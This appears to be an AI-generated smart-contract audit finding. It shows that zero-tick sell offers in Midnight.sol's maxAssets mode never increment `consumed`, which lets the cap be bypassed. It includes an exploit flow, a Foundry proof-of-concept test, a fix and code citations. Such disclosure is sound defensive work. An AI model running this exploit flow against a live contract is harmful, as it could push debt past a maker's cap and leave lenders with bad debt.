All key claims have been verified against the actual code. Here is the validated output:

---

Audit Report

## Title
Zero-price sell offer in `maxAssets` mode allows unlimited reuse — `consumed` never increments - (File: src/Midnight.sol)

## Summary
When a sell offer is created with `tick = 0` and `offer.maxAssets > 0`, `sellerAssets` computes to zero on every `take` call because `tickToPrice(0) == 0` and `mulDivUp(units, 0, WAD) == 0`. The `consumed` mapping is incremented by zero each call, so the `require(newConsumed <= offer.maxAssets)` guard is permanently satisfied and the offer can be taken an unlimited number of times, completely bypassing the `maxAssets` cap while the maker's debt grows without bound.

## Finding Description

**Root cause — `src/Midnight.sol` lines 358–369:**

`tickToPrice(0) == 0` is a confirmed protocol invariant, proven in `certora/specs/TickToPrice.spec` (`rule tickToPriceIsZeroAtZero`) and asserted in `test/TickLibTest.sol` (`assertEq(TickLib.tickToPrice(0), 0, "tick 0")`).

For a sell offer (`offer.buy == false`) with `tick = 0`:
- Line 358: `offerPrice = tickToPrice(0) = 0`
- Line 361: `sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice` → `sellerPrice = 0` (sell branch takes `offerPrice` directly)
- Line 364: `sellerAssets = units.mulDivUp(sellerPrice, WAD)` → `mulDivUp(units, 0, WAD)`

`mulDivUp` is defined in `src/libraries/UtilsLib.sol` line 35 as `(x * y + (d - 1)) / d`. With `x = units`, `y = 0`, `d = WAD = 1e18`: `(units * 0 + (1e18 - 1)) / 1e18 = (1e18 - 1) / 1e18 = 0` by integer division. So `sellerAssets = 0` for any nonzero `units`.

The consumed accounting then increments by zero:
```solidity
// src/Midnight.sol lines 367-369
newConsumed = consumed[offer.maker][offer.group] += sellerAssets; // += 0
require(newConsumed <= offer.maxAssets, ConsumedAssets());         // 0 <= N, always passes
```

Tick 0 is always accessible because `require(offer.tick % _marketState.tickSpacing == 0)` at line 351 is satisfied by `0 % tickSpacing == 0` for any `tickSpacing`.

**Settlement fee interaction:** With tick=0 on a sell offer, `sellerPrice = 0` and `buyerPrice = 0 + _settlementFee = _settlementFee`. The taker pays `mulDivUp(units, _settlementFee, WAD)` per call. If settlement fee is zero, the taker pays nothing at all.

**Exploit flow:**
1. Maker (borrower) creates a sell offer with `tick = 0`, `maxAssets = N > 0`, `maxUnits = 0`
2. Taker calls `take(offer, ..., units = K, ...)` repeatedly
3. Each call: `sellerAssets = 0`, `consumed += 0`, check `0 <= N` passes
4. Each call: `sellerPos.debt += K` (bounded per-call by the health check at line 476)
5. After M calls: `consumed[maker][group] = 0`, `debtOf(maker) = M * K`

**Why existing checks fail:**

The post-take health check at line 476 (`require(... || isHealthy(...), SellerIsLiquidatable())`) limits per-call debt increase to the seller's current collateral headroom, but does not fix the consumed accounting. As collateral value fluctuates, the health window reopens and the attack can continue across blocks.

The Certora `Consume.spec` rule `takeConsumedBoundedByMax` (line 62) uses `NONDET` summaries for both `TickLib.tickToPrice` (line 14) and `UtilsLib.mulDivUp` (line 12), so the concrete zero-price path where `mulDivUp(units, 0, WAD) = 0` is not covered by formal verification.

All existing `maxAssets` tests (`testMaxAssetsSellerExact`, `testMaxAssetsBuyerExact`, `testMaxAssetsSellerPass`, `testMaxAssetsBuyerPass`) use `MAX_TICK` (non-zero price). All existing zero-tick tests (`testPriceZeroNoSettlementFeeSell`, `testPriceZeroWithSettlementFeeSell`) use `maxUnits` mode, not `maxAssets` mode. The `testBugBuyMaxAssetsBypass` test documents a related but distinct rounding bug for buy offers with non-zero price where consumed is already at max — it does not cover the sell offer zero-price path where consumed never increments at all.

## Impact Explanation
The `maxAssets` cap — the sole mechanism preventing an assets-mode offer from being overfilled — is permanently bypassed. `consumed` stays at zero while the maker's debt grows without bound (bounded only by the per-call health check). The maker's `maxAssets` intent is completely unenforceable. As the maker's debt accumulates and collateral value fluctuates, the position becomes liquidatable and any shortfall becomes bad debt socialized across all lenders in the market. With zero settlement fee, the taker pays nothing per call, making the attack free to execute.

## Likelihood Explanation
**Preconditions:**
1. A sell offer exists with `tick = 0` and `offer.maxAssets > 0` — tick 0 is always a valid tick (`0 % tickSpacing == 0` for any `tickSpacing`), and a maker may set it intending a near-zero-rate offer
2. Taker is any unprivileged address (not the maker itself, due to the `SelfTake` check at line 354)

**Feasibility:** Fully reachable with no special privileges. Repeatable in a loop or across blocks. With zero settlement fee, the taker pays nothing per call. `DEFAULT_TICK_SPACING = 4` means tick 0 is always a valid tick.

## Recommendation
Add a guard that rejects `maxAssets` mode when the effective price used for consumption tracking is zero. For a sell offer, reject if `sellerPrice == 0`; for a buy offer, reject if `buyerPrice == 0`. Concretely, after computing `sellerAssets` and `buyerAssets`, require that the consumed delta is nonzero when `units > 0` and `maxAssets > 0`:

```solidity
uint256 consumedDelta = offer.buy ? buyerAssets : sellerAssets;
if (offer.maxAssets > 0) {
    require(units == 0 || consumedDelta > 0, ZeroPriceMaxAssetsOffer());
    newConsumed = consumed[offer.maker][offer.group] += consumedDelta;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

Alternatively, disallow `tick = 0` when `maxAssets > 0`, or require `offerPrice > 0` when `maxAssets > 0`.

## Proof of Concept
Minimal Foundry test (extend `TakeTest`):

```solidity
function testZeroPriceSellMaxAssetsBypass() public {
    uint256 units = 1e18;
    uint256 maxAssetsCap = 1e18; // any nonzero value

    borrowerOffer.tick = 0;
    borrowerOffer.maxUnits = 0;
    borrowerOffer.maxAssets = maxAssetsCap;

    collateralize(market, borrower, units * 10); // enough collateral for multiple takes

    // First take: consumed should increment but doesn't
    take(units, lender, borrowerOffer);
    assertEq(midnight.consumed(borrower, borrowerOffer.group), 0); // BUG: should be > 0
    assertEq(midnight.debtOf(id, borrower), units);

    // Second take: should revert (maxAssets exhausted) but doesn't
    take(units, lender, borrowerOffer);
    assertEq(midnight.consumed(borrower, borrowerOffer.group), 0); // BUG: still 0
    assertEq(midnight.debtOf(id, borrower), 2 * units); // debt doubled, cap bypassed
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) [9](#0-8) [10](#0-9) [11](#0-10)

### Citations

**File:** certora/specs/TickToPrice.spec (L34-36)
```text
rule tickToPriceIsZeroAtZero() {
    assert tickToPrice(0) == 0;
}
```

**File:** test/TickLibTest.sol (L15-17)
```text
    function testTickToPriceMinMax() public pure {
        assertEq(TickLib.tickToPrice(0), 0, "tick 0");
        assertEq(TickLib.tickToPrice(2), 1e12, "first non-zero tick");
```

**File:** src/Midnight.sol (L351-351)
```text
        require(offer.tick % _marketState.tickSpacing == 0, TickNotAccessible());
```

**File:** src/Midnight.sol (L358-369)
```text
        uint256 offerPrice = TickLib.tickToPrice(offer.tick);
        uint256 timeToMaturity = UtilsLib.zeroFloorSub(offer.market.maturity, block.timestamp);
        uint256 _settlementFee = settlementFee(id, timeToMaturity);
        uint256 sellerPrice = offer.buy ? offerPrice - _settlementFee : offerPrice;
        uint256 buyerPrice = sellerPrice + _settlementFee;
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** src/Midnight.sol (L476-476)
```text
        require(liquidationLocked(id, seller) || isHealthy(offer.market, id, seller), SellerIsLiquidatable());
```

**File:** src/libraries/UtilsLib.sol (L33-36)
```text
    /// @dev Returns (x * y) / d rounded up.
    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y + (d - 1)) / d;
    }
```

**File:** certora/specs/Consume.spec (L11-14)
```text
    function UtilsLib.mulDivDown(uint256, uint256, uint256) internal returns (uint256) => NONDET;
    function UtilsLib.mulDivUp(uint256, uint256, uint256) internal returns (uint256) => NONDET;
    function UtilsLib.msb(uint128) internal returns (uint256) => NONDET;
    function TickLib.tickToPrice(uint256) internal returns (uint256) => NONDET;
```

**File:** certora/specs/Consume.spec (L59-63)
```text
rule takeConsumedBoundedByMax(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiver, address takerCallback, bytes takerCallbackData) {
    take(e, offer, ratifierData, units, taker, receiver, takerCallback, takerCallbackData);

    assert offer.maxAssets > 0 => consumed(offer.maker, offer.group) <= offer.maxAssets;
    assert offer.maxAssets == 0 => consumed(offer.maker, offer.group) <= offer.maxUnits;
```

**File:** test/TakeTest.sol (L797-823)
```text
    function testMaxAssetsSellerExact() public {
        uint256 units = 100e18;
        deal(address(loanToken), lender, units);
        collateralize(market, borrower, units);
        uint256 price = TickLib.tickToPrice(MAX_TICK);
        uint256 expectedSellerAssets = units.mulDivUp(price, WAD);

        borrowerOffer.maxUnits = 0;
        borrowerOffer.maxAssets = expectedSellerAssets;

        (, uint256 sellerAssets) = take(units, lender, borrowerOffer);
        assertEq(sellerAssets, expectedSellerAssets);
    }

    function testMaxAssetsBuyerExact() public {
        uint256 units = 100e18;
        deal(address(loanToken), lender, units);
        collateralize(market, borrower, units);
        uint256 price = TickLib.tickToPrice(MAX_TICK);
        uint256 expectedBuyerAssets = units.mulDivDown(price, WAD);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = expectedBuyerAssets;

        (uint256 buyerAssets,) = take(units, borrower, lenderOffer);
        assertEq(buyerAssets, expectedBuyerAssets);
    }
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```

**File:** test/TakeTest.sol (L1210-1251)
```text
    // fee=0, sell, units
    function testPriceZeroNoSettlementFeeSell() public {
        uint256 units = 1e18;
        borrowerOffer.tick = 0;
        borrowerOffer.maxUnits = units;
        collateralize(market, borrower, units);
        (uint256 buyerAssets, uint256 sellerAssets) = take(units, lender, borrowerOffer);
        assertEq(buyerAssets, 0, "buyerAssets");
        assertEq(sellerAssets, 0, "sellerAssets");
        assertEq(midnight.creditOf(id, lender), units, "creditOf");
        assertEq(midnight.debtOf(id, borrower), units, "debtOf");
    }

    // fee>0, buy, units
    function testPriceZeroWithSettlementFeeBuy() public {
        midnight.touchMarket(market);
        midnight.setMarketSettlementFee(id, 1, 1e12);
        uint256 units = 1e18;
        lenderOffer.tick = 0;
        lenderOffer.maxUnits = units;
        collateralize(market, borrower, units);
        vm.expectRevert();
        take(units, borrower, lenderOffer);
    }

    // fee>0, sell, units
    function testPriceZeroWithSettlementFeeSell() public {
        midnight.touchMarket(market);
        midnight.setMarketSettlementFee(id, 1, 1e12);
        uint256 fee = midnight.settlementFee(id, market.maturity - vm.getBlockTimestamp());
        uint256 units = 1e18;
        borrowerOffer.tick = 0;
        borrowerOffer.maxUnits = units;
        uint256 expectedBuyerAssets = units.mulDivUp(fee, WAD);
        deal(address(loanToken), lender, expectedBuyerAssets);
        collateralize(market, borrower, units);
        (uint256 buyerAssets, uint256 sellerAssets) = take(units, lender, borrowerOffer);
        assertEq(buyerAssets, expectedBuyerAssets, "buyerAssets");
        assertEq(sellerAssets, 0, "sellerAssets");
        assertEq(midnight.creditOf(id, lender), units, "creditOf");
        assertEq(midnight.debtOf(id, borrower), units, "debtOf");
    }
```
